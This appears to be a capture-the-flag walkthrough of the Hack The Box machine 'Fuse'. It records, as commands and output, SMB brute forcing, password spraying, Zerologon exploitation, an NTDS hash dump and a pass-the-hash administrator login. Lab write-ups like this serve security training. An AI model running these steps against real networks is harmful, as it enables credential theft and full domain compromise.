## Brute Force
#### Cewl to get a pwd dictionary
It may take a minute or so
```bash
❯ cewl --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm -w cewl3.txt  
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```


#### Hydra
It may take two or three minutes
```bash
❯ cat users.txt  
pmerton  
tlavel   
❯ export IP=10.129.2.5           
❯ hydra -L users.txt -P cewl3.txt $IP smb
[445][smb] host: 10.129.2.5   login: tlavel   password: Fabricorp01
```
## SMB 
#### smbclient
```bash
❯ smbclient -L $IP -U tlavel  
Password for [WORKGROUP\tlavel]:  
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```
#### smbpasswd to update it
```bash
smbpasswd -r $IP -U tlavel <- won't work, use impacket instead

❯ /usr/bin/impacket-smbpasswd -newpass Qwer4321= tlavel:Fabricorp01@$IP  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[!] Password is expired, trying to bind with a null session.  
[*] Password was changed successfully.
```
## RPC enum printers
```bash
❯ rpcclient -U "tlavel" $IP  
Password for [WORKGROUP\tlavel]:  
rpcclient $> enumprinters  
       flags:[0x800000]  
       name:[\\10.129.2.5\HP-MFT01]  
       description:[\\10.129.2.5\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]  
       comment:[]
❯ cat enumdomusers.txt | cut -d "]" -f1 | cut -d "[" -f2
```
#### Optional: crackmapexec build users.list
```
❯ crackmapexec smb $IP -u bhult -p Qwer4321=
```
## Password Spray
* https://github.com/A1vinSmith/OSCP-PWK/blob/master/HackTheBox/Windows/Active%20Directory/Forest/README.md#password-spraying---making-a-target-user-list-htb-academy
```bash
❯ crackmapexec winrm $IP -u users.txt -p '$fab@s3Rv1ce$1'  
SMB         10.129.2.5      5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)  
HTTP        10.129.2.5      5985   FUSE             [*] http://10.129.2.5:5985/wsman  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```
## Foothold
```bash
evil-winrm -i $IP -u svc-print -p '$fab@s3Rv1ce$1'
```

## Reference
* https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
* https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system
* https://www.hackingarticles.in/fuse-hackthebox-walkthrough/
* https://github.com/Kyuu-Ji/htb-write-up/blob/master/fuse/write-up-fuse.md
* https://www.secjuice.com/htb-fuse-walkthrough/
* https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/
* https://snowscan.io/htb-writeup-fuse/
* https://chr0x6eos.github.io/2020/10/31/htb-Fuse.html
* https://github.com/FuzzySecurity/Capcom-Rootkit
* https://fuzzysecurity.com/tutorials/28.html
* https://steflan-security.com/hack-the-box-fuse-walkthrough/
* https://github.com/A1vinSmith/htb-scripts
* https://initone.dz/htb-walkthrough-fuse/

## Privilege Escalation
### Method 1: SeLoadDriverPrivilege
```bash cmd
whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeLoadDriverPrivilege         Load and unload device drivers Enabled
```
### Method 2: Zerologon
https://github.com/A1vinSmith/zerologon

#### Check doamin's NetBIOS
```powershell
nbtstat -n  
  
Ethernet0 2:  
Node IpAddress: [10.129.2.5] Scope Id: []  
  
               NetBIOS Local Name Table  
  
      Name               Type         Status  
   ---------------------------------------------  
   FUSE           <00>  UNIQUE      Registered  
   FABRICORP      <1C>  GROUP       Registered  
   FABRICORP      <00>  GROUP       Registered  
   FUSE           <20>  UNIQUE      Registered  
   FABRICORP      <1B>  UNIQUE      Registered
```

#### Set DC to empty string password
```bash
❯ python set_empty_pw.py FUSE $IP  
Performing authentication attempts...  
=============================================================  
NetrServerAuthenticate3Response    
ServerCredential:                  
   Data:                            b'\xe5Q\xe0\xdfa\xddt+'    
NegotiateFlags:                  556793855    
AccountRid:                      1000    
ErrorCode:                       0    
  
  
server challenge b'\xe5\xe9<t\xdeO]k'  
NetrServerPasswordSet2Response    
ReturnAuthenticator:               
   Credential:                        
       Data:                            b'\x01\xdb\xb3\xba\xf2A\xe1\xde'    
   Timestamp:                       0    
ErrorCode:                       0    
  
  
  
Success! DC should now have the empty string as its machine password.
```

```bash
impacket-secretsdump -just-dc -no-pass FUSE\$@$IP  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
svc-print:1104:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::  
bnielson:1105:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::  
sthompson:1601:aad3b435b51404eeaad3b435b51404ee:5fb3cc8b2f45791e200d740725fdf8fd:::  
tlavel:1602:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::  
pmerton:1603:aad3b435b51404eeaad3b435b51404ee:e76e0270c2018153275aab1e143421b2:::  
svc-scan:1605:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::  
bhult:7101:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::  
dandrews:7102:aad3b435b51404eeaad3b435b51404ee:689583f00ad18c124c58405479b4c536:::  
mberbatov:7601:aad3b435b51404eeaad3b435b51404ee:b2bdbe60565b677dfb133866722317fd:::  
astein:7602:aad3b435b51404eeaad3b435b51404ee:2f74c867a93cda5a255b1d8422192d80:::  
dmuir:7603:aad3b435b51404eeaad3b435b51404ee:6320f0682f940651742a221d8218d161:::  
FUSE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:e6dcafd3738f9433358d59ef8015386a8c0a418a09b3e8968f8a00c6fa077984  
Administrator:aes128-cts-hmac-sha1-96:83c4a7c2b6310e0b2323d7c67c9a8d68  
Administrator:des-cbc-md5:0dfe83ce576d8aae  
krbtgt:aes256-cts-hmac-sha1-96:5a844c905bc3ea680729e0044a00a817bb8e6b8a89c01b0d2f949e2d7ac9952e  
krbtgt:aes128-cts-hmac-sha1-96:67f0c1ace3b5a9f43e90a00c1e5445c6  
krbtgt:des-cbc-md5:49d93d43321f02b3  
svc-print:aes256-cts-hmac-sha1-96:f06c128c73c7a4a2a6817ee22ce59979eac9789adf7043acbf11721f3b07b754  
svc-print:aes128-cts-hmac-sha1-96:b662d12fedf3017aed71b2bf96ac6a99  
svc-print:des-cbc-md5:fea11fdf6bd3105b  
bnielson:aes256-cts-hmac-sha1-96:62aef12b7b5d68fe508b5904d2966a27f98ad83b5ca1fb9930bbcf420c2a16b6  
bnielson:aes128-cts-hmac-sha1-96:70140834e3319d7511afa5c5b9ca4b32  
bnielson:des-cbc-md5:9826c42010254a76  
sthompson:aes256-cts-hmac-sha1-96:e93eb7d969f30a4acb55cff296599cc31f160cca523a63d3b0f9eba2787e63a5  
sthompson:aes128-cts-hmac-sha1-96:a8f79b1eb4209a0b388d1bb99b94b0d9  
sthompson:des-cbc-md5:4f9291c46291ba02  
tlavel:aes256-cts-hmac-sha1-96:f415075d6b6566912c97a4e9a0249b2b209241c341534cb849b657711de11525  
tlavel:aes128-cts-hmac-sha1-96:9ac52b65b9013838f129bc9a99826a4f  
tlavel:des-cbc-md5:2a238576ab7a6213  
pmerton:aes256-cts-hmac-sha1-96:102465f59909683f260981b1d93fa7d0f45778de11b636002082575456170db7  
pmerton:aes128-cts-hmac-sha1-96:4dc80267b0b2ecc02e437aef76714710  
pmerton:des-cbc-md5:ef3794940d6d0120  
svc-scan:aes256-cts-hmac-sha1-96:053a97a7a728359be7aa5f83d3e81e81637ec74810841cc17acd1afc29850e5c  
svc-scan:aes128-cts-hmac-sha1-96:1ae5f4fecd5b3bd67254d21f6adb6d56  
svc-scan:des-cbc-md5:e30b208ccecd57ad  
bhult:aes256-cts-hmac-sha1-96:f1097eb00e508bf95f4756a28f18f490c40ed3274b2fd67da8919647591e2c74  
bhult:aes128-cts-hmac-sha1-96:b1f2affb4c9d4c70b301923cc5d89336  
bhult:des-cbc-md5:4a1a209d4532a7b9  
dandrews:aes256-cts-hmac-sha1-96:d2c7389d3185d2e68e47d227d817556349967cac1d5bfacb780aaddffeb34dce  
dandrews:aes128-cts-hmac-sha1-96:497bd974ccfd3979edb0850dc65fa0a8  
dandrews:des-cbc-md5:9ec2b53eae6b20f2  
mberbatov:aes256-cts-hmac-sha1-96:11abccced1c06bfae96b0309c533812976b5b547d2090f1eaa590938afd1bc4a  
mberbatov:aes128-cts-hmac-sha1-96:fc50f72a3f79c2abc43d820f849034da  
mberbatov:des-cbc-md5:8023a16b9b3d5186  
astein:aes256-cts-hmac-sha1-96:7f43bea8fd662b275434644b505505de055cdfa39aeb0e3794fec26afd077735  
astein:aes128-cts-hmac-sha1-96:0d27194d0733cf16b5a19281de40ad8b  
astein:des-cbc-md5:254f802902f8ec7a  
dmuir:aes256-cts-hmac-sha1-96:67ffc8759725310ba34797753b516f57e0d3000dab644326aea69f1a9e8fedf0  
dmuir:aes128-cts-hmac-sha1-96:692fde98f45bf520d494f50f213c6762  
dmuir:des-cbc-md5:7fb515d59846498a  
FUSE$:aes256-cts-hmac-sha1-96:ba250f2101ecad1a2aa8fab0c95d7a66b59c904eb0edd47121f51ff561f3fb2e  
FUSE$:aes128-cts-hmac-sha1-96:bf995eed47e2a8849b72e95eabd5a929  
FUSE$:des-cbc-md5:b085ab974ff1e049  
[*] Cleaning up...
```

```bash
evil-winrm -i $IP -u Administrator -H 370ddcf45959b2293427baa70376e14e
```
